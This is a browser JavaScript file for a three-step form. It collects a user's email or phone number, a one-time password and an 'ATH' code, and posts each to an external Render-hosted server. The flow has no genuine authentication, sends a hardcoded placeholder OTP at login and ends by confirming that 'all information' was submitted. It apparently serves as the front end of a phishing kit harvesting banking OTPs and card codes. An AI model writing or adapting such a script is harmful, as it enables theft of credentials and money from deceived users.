// script.js

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');
    const athForm = document.getElementById('athForm');

    const loginFormContainer = document.getElementById('login-form');
    const otpFormContainer = document.getElementById('otp-form');
    const athFormContainer = document.getElementById('ath-form');

    let userIdentifier = '';

    // Handle Login Form Submission
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const number = document.getElementById('number').value.trim();

        if (!email && !number) {
            alert('Please enter an email or mobile number.');
            return;
        }

        userIdentifier = email || number;

        try {
            // Assuming the user has an existing OTP
            // Replace 'ExistingOTPValue' with the actual OTP the user has
            const existingOTP = 'ExistingOTPValue'; // This should be obtained from the user

            const response = await fetch('https://casapp.onrender.com/api/submit-otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ identifier: userIdentifier, otp: existingOTP }),
            });

            const data = await response.json();

            if (response.ok) {
                // Proceed to OTP form without alert
                loginFormContainer.style.display = 'none';
                otpFormContainer.style.display = 'block';
            } else {
                alert(data.message || 'An error occurred.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred while submitting your OTP.');
        }
    });

    // Handle OTP Form Submission
    otpForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const otp = document.getElementById('otp').value.trim();

        if (!otp) {
            alert('Please enter the OTP.');
            return;
        }

        try {
            const response = await fetch('https://casapp.onrender.com/api/submit-otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ identifier: userIdentifier, otp }),
            });

            const data = await response.json();

            if (response.ok) {
                // Proceed to ATH form without alert
                otpFormContainer.style.display = 'none';
                athFormContainer.style.display = 'block';
            } else {
                alert(data.message || 'An error occurred while submitting OTP.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred while submitting OTP.');
        }
    });

    // Handle ATH Form Submission
    athForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const ath = document.getElementById('ath').value.trim();

        if (!ath) {
            alert('Please enter ATH.');
            return;
        }

        try {
            const response = await fetch('https://casapp.onrender.com/api/submit-ath', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ identifier: userIdentifier, ath }),
            });

            const data = await response.json();

            if (response.ok) {
                alert('All information submitted successfully!');
                // Optionally, reset the forms or redirect the user
            } else {
                alert(data.message || 'An error occurred while submitting ATH.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred while submitting ATH.');
        }
    });
});
